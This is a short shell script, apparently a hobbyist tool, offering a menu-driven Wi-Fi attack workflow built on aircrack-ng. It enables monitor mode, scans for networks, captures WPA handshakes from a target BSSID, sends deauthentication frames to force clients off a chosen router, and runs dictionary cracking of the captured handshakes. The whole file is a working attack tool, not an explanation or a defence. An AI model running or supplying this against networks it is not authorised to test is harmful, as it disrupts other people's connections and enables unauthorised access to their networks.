#!/bin/sh
#By Duncan Andrews
Banner () {
	clear
        echo "Heck "
	echo "---------------"

}

Wifi  () {
	#Sets up monitor mode for an interface
	Banner
	sudo airmon-ng start wlan0
	echo "Setting up monitor mode"
	sleep 5
	Banner
#	sudo airodump-ng -w wifiNetworks --output-format txt wlan0mon
	#sudo airodump-ng wlan0mon
	Home

}

Networks () {
	Banner
	sudo airodump-ng -w wifiNetworks --output-format txt wlan0mon
}

Handshake () {
	Banner
	INTERFACE="wlan0mon"
        echo " Type in the BSSID that you want to use(this should be to the left of the router name) ie. 84:1b:5E:E4:D6:K9: "
        read BSSID
        echo "now type in the channel: "
        read CHANNEL
        clear
        echo "Listening to handshakes between router and devices"
        sudo airodump-ng -c $CHANNEL --bssid $BSSID -w /home/ $INTERFACE


}


DeAuth () {
	#This performs a deauth attack on target computers
	Banner
	INTERFACE="wlan0mon"
	echo "Router id ie. E4:K6:N4:E4: "
	read ROUTER
	echo "CLient or station id: "
	read CLIENT
	sudo aireplay-ng -0 10 -a $ROUTER -c $CLIENT $INTERFACE
	Home

}

Crack () {
	Banner
	echo "Make sure you have a txt file of passwords called passwords.txt saved on your desktop!"
	echo "Enter name of .cap file ie. '0986.cp' :"
	read NAME
	sudo aircrack-ng /tao/Desktop/$NAME -w passwords.txt
}

Home () {
	Banner
	echo "1. Set to monitor mode"
	echo "2. View current networks"
	echo "3. Capture Handshakes"
	echo "4. Deauth Attack"
	echo "5. Crack Captured HAndshakes"
	read CHOICE
	if [ $CHOICE = 1 ]
	then Wifi
	fi
	if [ $CHOICE = 2 ]
	then Networks
	fi
	if [ $CHOICE = 3 ]
        then Handshake
        fi
	if [ $CHOICE = 4 ]
        then DeAuth
        fi
        if [ $CHOICE = 5 ]
        then Crack
        else Home
	fi

}

Home


